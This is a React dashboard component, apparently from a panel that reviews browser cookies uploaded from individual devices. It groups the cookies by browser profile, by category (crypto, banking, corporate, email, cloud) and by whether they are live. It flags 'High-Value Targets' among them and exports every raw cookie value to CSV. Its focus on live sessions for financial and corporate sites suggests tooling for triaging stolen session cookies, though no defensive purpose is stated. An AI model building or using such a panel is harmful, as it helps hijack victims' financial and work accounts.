"use client"

import { useEffect, useState } from "react"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import { ScrollArea } from "@/components/ui/scroll-area"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Cookie, Download, Shield, AlertTriangle, CheckCircle, Lock, Globe, Clock, XCircle } from "lucide-react"
import { toast } from "sonner"

interface CookiesTableProps {
  deviceId: string
}

interface CookieData {
  id: number
  host_key: string
  name: string
  value: string
  path: string
  expires_utc: number
  is_secure: boolean
  is_httponly: boolean
  same_site: string | null
  primary_category: string
  categories: string[]
  risk_level: string
  risk_score: number
  browser: string
  profile: string
  file_path: string
  created_at: string

  // New expiration tracking fields
  is_session_cookie: boolean
  is_live: boolean
  expires_at: string | null
  days_until_expiry: number | null
  days_since_expiry: number | null
}

interface CookiesResponse {
  success: boolean
  device_id: string
  device_name: string
  upload_date: string
  filters: {
    category: string | null
    risk: string | null
    status: string | null
    profile: string | null
  }
  stats: {
    total_cookies: number
    unique_domains: number
    unique_browsers: number
    unique_profiles: number
    secure_cookies: number
    httponly_cookies: number

    // Expiration status
    live_cookies: number
    expired_cookies: number
    session_cookies: number

    // Risk breakdown
    critical_risk: number
    high_risk: number
    medium_risk: number
    low_risk: number

    // Category breakdown (total)
    crypto_cookies: number
    banking_cookies: number
    corporate_cookies: number
    email_cookies: number
    cloud_cookies: number
    social_cookies: number
    ecommerce_cookies: number
    gaming_cookies: number

    // Category breakdown (live only)
    live_crypto: number
    live_banking: number
    live_corporate: number
    live_email: number
    live_cloud: number
    live_social: number
    live_ecommerce: number
    live_gaming: number
  }
  cookies: {
    all: CookieData[]
    by_category: Record<string, CookieData[]>
    by_risk: Record<string, CookieData[]>
    by_domain: Record<string, CookieData[]>
    by_profile: Record<string, CookieData[]>
    top_domains: Array<{
      domain: string
      total_count: number
      live_count: number
      expired_count: number
      session_count: number
      primary_category: string
      risk_level: string
      risk_score: number
    }>
    profile_stats: Array<{
      profile: string
      total_count: number
      live_count: number
      expired_count: number
      session_count: number
      browsers: string[]
      live_crypto: number
      live_banking: number
      live_corporate: number
    }>
    high_value_targets: CookieData[]
    live_high_value_targets: CookieData[]
  }
}

export function CookiesTable({ deviceId }: CookiesTableProps) {
  const [data, setData] = useState<CookiesResponse | null>(null)
  const [loading, setLoading] = useState(true)
  const [categoryFilter, setCategoryFilter] = useState<string>("all")
  const [riskFilter, setRiskFilter] = useState<string>("all")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [profileFilter, setProfileFilter] = useState<string>("all")

  useEffect(() => {
    fetchCookies()
  }, [deviceId, categoryFilter, riskFilter, statusFilter, profileFilter])

  const fetchCookies = async () => {
    try {
      setLoading(true)
      let url = `/api/v1/cookies/${deviceId}`
      const params = new URLSearchParams()

      if (categoryFilter !== "all") {
        params.append("category", categoryFilter)
      }
      if (riskFilter !== "all") {
        params.append("risk", riskFilter)
      }
      if (statusFilter !== "all") {
        params.append("status", statusFilter)
      }
      if (profileFilter !== "all") {
        params.append("profile", profileFilter)
      }

      if (params.toString()) {
        url += `?${params.toString()}`
      }

      const response = await fetch(url)
      const result = await response.json()

      if (result.success) {
        setData(result)
      } else {
        toast.error(result.error || "Failed to fetch cookies")
      }
    } catch (error) {
      console.error("Error fetching cookies:", error)
      toast.error("Failed to fetch cookies")
    } finally {
      setLoading(false)
    }
  }

  const exportCookies = () => {
    if (!data || data.cookies.all.length === 0) {
      toast.error("No cookies to export")
      return
    }

    const csv = [
      ["Domain", "Name", "Value", "Category", "Risk Level", "Risk Score", "Secure", "HttpOnly", "Browser"].join(","),
      ...data.cookies.all.map(cookie =>
        [
          cookie.host_key,
          cookie.name,
          `"${cookie.value.replace(/"/g, '""')}"`,
          cookie.primary_category,
          cookie.risk_level,
          cookie.risk_score,
          cookie.is_secure,
          cookie.is_httponly,
          cookie.browser
        ].join(",")
      )
    ].join("\n")

    const blob = new Blob([csv], { type: 'text/csv' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `cookies-${deviceId}-${Date.now()}.csv`
    a.click()
    URL.revokeObjectURL(url)
    toast.success(`Exported ${data.cookies.all.length} cookies`)
  }

  const getRiskBadge = (level: string, score: number) => {
    switch (level) {
      case 'critical':
        return <Badge variant="destructive" className="bg-red-600">CRITICAL ({score})</Badge>
      case 'high':
        return <Badge variant="destructive">HIGH ({score})</Badge>
      case 'medium':
        return <Badge className="bg-yellow-600">MEDIUM ({score})</Badge>
      case 'low':
        return <Badge variant="secondary">LOW ({score})</Badge>
      default:
        return <Badge variant="outline">UNKNOWN</Badge>
    }
  }

  const getCategoryBadge = (category: string) => {
    const colors: Record<string, string> = {
      crypto: "bg-orange-600",
      banking: "bg-green-600",
      corporate: "bg-blue-600",
      email: "bg-purple-600",
      cloud: "bg-cyan-600",
      social: "bg-pink-600",
      ecommerce: "bg-indigo-600",
      gaming: "bg-violet-600"
    }

    return (
      <Badge className={colors[category] || "bg-gray-600"}>
        {category.toUpperCase()}
      </Badge>
    )
  }

  const getStatusBadge = (cookie: CookieData) => {
    if (cookie.is_session_cookie) {
      return (
        <Badge variant="outline" className="flex items-center gap-1 w-fit">
          <Cookie className="h-3 w-3" />
          SESSION
        </Badge>
      )
    }

    if (cookie.is_live) {
      return (
        <Badge className="bg-green-600 flex items-center gap-1 w-fit">
          <CheckCircle className="h-3 w-3" />
          LIVE {cookie.days_until_expiry && `(${cookie.days_until_expiry}d)`}
        </Badge>
      )
    }

    return (
      <Badge variant="destructive" className="flex items-center gap-1 w-fit">
        <XCircle className="h-3 w-3" />
        EXPIRED {cookie.days_since_expiry && `(${cookie.days_since_expiry}d ago)`}
      </Badge>
    )
  }

  if (loading) {
    return <div className="text-center py-8">Loading cookies...</div>
  }

  if (!data) {
    return <div className="text-center py-8">No cookie data available</div>
  }

  return (
    <div className="space-y-4">
      {/* High-Value Targets Alert */}
      {data.cookies.high_value_targets.length > 0 && (
        <Card className="border-red-500/20 bg-red-500/5">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-red-500">
              <AlertTriangle className="h-5 w-5" />
              High-Value Targets Detected
            </CardTitle>
            <CardDescription>
              {data.cookies.high_value_targets.length} high-risk cookies found in critical categories (crypto, banking, corporate)
            </CardDescription>
          </CardHeader>
        </Card>
      )}

      {/* Stats Overview */}
      <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4">
        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Live Cookies</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-500">{data.stats.live_cookies}</div>
            <p className="text-xs text-muted-foreground">{data.stats.expired_cookies} expired</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Live Crypto</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-orange-500">{data.stats.live_crypto}</div>
            <p className="text-xs text-muted-foreground">of {data.stats.crypto_cookies} total</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Live Banking</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-500">{data.stats.live_banking}</div>
            <p className="text-xs text-muted-foreground">of {data.stats.banking_cookies} total</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Live Corporate</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-blue-500">{data.stats.live_corporate}</div>
            <p className="text-xs text-muted-foreground">of {data.stats.corporate_cookies} total</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Session Cookies</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-purple-500">{data.stats.session_cookies}</div>
            <p className="text-xs text-muted-foreground">no expiration</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="pb-2">
            <CardTitle className="text-sm font-medium text-muted-foreground">Profiles</CardTitle>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold">{data.stats.unique_profiles}</div>
            <p className="text-xs text-muted-foreground">{data.stats.unique_domains} domains</p>
          </CardContent>
        </Card>
      </div>

      {/* Filters and Export */}
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div>
              <CardTitle className="flex items-center gap-2">
                <Cookie className="h-5 w-5" />
                Raw Cookies
              </CardTitle>
              <CardDescription>
                Browser cookies with risk scoring and categorization
              </CardDescription>
            </div>
            <Button variant="outline" size="sm" onClick={exportCookies}>
              <Download className="h-4 w-4 mr-2" />
              Export CSV
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <div className="flex gap-4 mb-4">
            <div className="flex items-center gap-2">
              <label className="text-sm font-medium">Category:</label>
              <Select value={categoryFilter} onValueChange={setCategoryFilter}>
                <SelectTrigger className="w-40">
                  <SelectValue placeholder="All" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Categories</SelectItem>
                  <SelectItem value="crypto">Crypto</SelectItem>
                  <SelectItem value="banking">Banking</SelectItem>
                  <SelectItem value="corporate">Corporate</SelectItem>
                  <SelectItem value="email">Email</SelectItem>
                  <SelectItem value="cloud">Cloud</SelectItem>
                  <SelectItem value="social">Social</SelectItem>
                  <SelectItem value="ecommerce">E-commerce</SelectItem>
                  <SelectItem value="gaming">Gaming</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="flex items-center gap-2">
              <label className="text-sm font-medium">Risk:</label>
              <Select value={riskFilter} onValueChange={setRiskFilter}>
                <SelectTrigger className="w-32">
                  <SelectValue placeholder="All" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Risks</SelectItem>
                  <SelectItem value="critical">Critical</SelectItem>
                  <SelectItem value="high">High</SelectItem>
                  <SelectItem value="medium">Medium</SelectItem>
                  <SelectItem value="low">Low</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="flex items-center gap-2">
              <label className="text-sm font-medium">Status:</label>
              <Select value={statusFilter} onValueChange={setStatusFilter}>
                <SelectTrigger className="w-32">
                  <SelectValue placeholder="All" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="all">All Status</SelectItem>
                  <SelectItem value="live">Live Only</SelectItem>
                  <SelectItem value="expired">Expired</SelectItem>
                  <SelectItem value="session">Session Cookies</SelectItem>
                </SelectContent>
              </Select>
            </div>

            {data.stats.unique_profiles > 0 && (
              <div className="flex items-center gap-2">
                <label className="text-sm font-medium">Profile:</label>
                <Select value={profileFilter} onValueChange={setProfileFilter}>
                  <SelectTrigger className="w-40">
                    <SelectValue placeholder="All" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="all">All Profiles</SelectItem>
                    {data.cookies.profile_stats?.map(profile => (
                      <SelectItem key={profile.profile} value={profile.profile}>
                        {profile.profile} ({profile.live_count} live)
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
            )}
          </div>

          <ScrollArea className="h-[600px]">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Domain</TableHead>
                  <TableHead>Name</TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>Expires</TableHead>
                  <TableHead>Category</TableHead>
                  <TableHead>Risk</TableHead>
                  <TableHead>Security</TableHead>
                  <TableHead>Browser</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {data.cookies.all.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={8} className="text-center py-8 text-muted-foreground">
                      No cookies found matching the selected filters
                    </TableCell>
                  </TableRow>
                ) : (
                  data.cookies.all.map((cookie) => (
                    <TableRow key={cookie.id}>
                      <TableCell className="font-medium">
                        <div className="flex items-center gap-2">
                          <Globe className="h-4 w-4 text-muted-foreground" />
                          {cookie.host_key}
                        </div>
                      </TableCell>
                      <TableCell className="font-mono text-xs max-w-[200px] truncate">{cookie.name}</TableCell>
                      <TableCell>{getStatusBadge(cookie)}</TableCell>
                      <TableCell>
                        {cookie.expires_at ? (
                          <div className="text-xs">
                            <div>{new Date(cookie.expires_at).toLocaleDateString()}</div>
                            <div className="text-muted-foreground">
                              {new Date(cookie.expires_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                            </div>
                          </div>
                        ) : (
                          <span className="text-xs text-muted-foreground">Session</span>
                        )}
                      </TableCell>
                      <TableCell>{getCategoryBadge(cookie.primary_category)}</TableCell>
                      <TableCell>{getRiskBadge(cookie.risk_level, cookie.risk_score)}</TableCell>
                      <TableCell>
                        <div className="flex flex-col gap-1">
                          {cookie.is_secure && (
                            <Badge variant="outline" className="flex items-center gap-1 w-fit text-xs">
                              <Lock className="h-3 w-3" />
                              Secure
                            </Badge>
                          )}
                          {cookie.is_httponly && (
                            <Badge variant="outline" className="flex items-center gap-1 w-fit text-xs">
                              <Shield className="h-3 w-3" />
                              HttpOnly
                            </Badge>
                          )}
                        </div>
                      </TableCell>
                      <TableCell>{cookie.browser}</TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </ScrollArea>
        </CardContent>
      </Card>

      {/* Top Domains by Live Cookie Count */}
      <Card>
        <CardHeader>
          <CardTitle>Top Domains by Live Cookies</CardTitle>
          <CardDescription>Domains sorted by number of valid (non-expired) cookies</CardDescription>
        </CardHeader>
        <CardContent>
          <ScrollArea className="h-[300px]">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Domain</TableHead>
                  <TableHead>Live</TableHead>
                  <TableHead>Expired</TableHead>
                  <TableHead>Session</TableHead>
                  <TableHead>Category</TableHead>
                  <TableHead>Risk</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {data.cookies.top_domains.map((domain, index) => (
                  <TableRow key={index}>
                    <TableCell className="font-medium">{domain.domain}</TableCell>
                    <TableCell>
                      <Badge className="bg-green-600">{domain.live_count}</Badge>
                    </TableCell>
                    <TableCell>
                      <Badge variant="outline">{domain.expired_count}</Badge>
                    </TableCell>
                    <TableCell>
                      <Badge variant="secondary">{domain.session_count}</Badge>
                    </TableCell>
                    <TableCell>{getCategoryBadge(domain.primary_category)}</TableCell>
                    <TableCell>{getRiskBadge(domain.risk_level, domain.risk_score)}</TableCell>
                  </TableRow>
                ))}
              </TableBody>
            </Table>
          </ScrollArea>
        </CardContent>
      </Card>
    </div>
  )
}
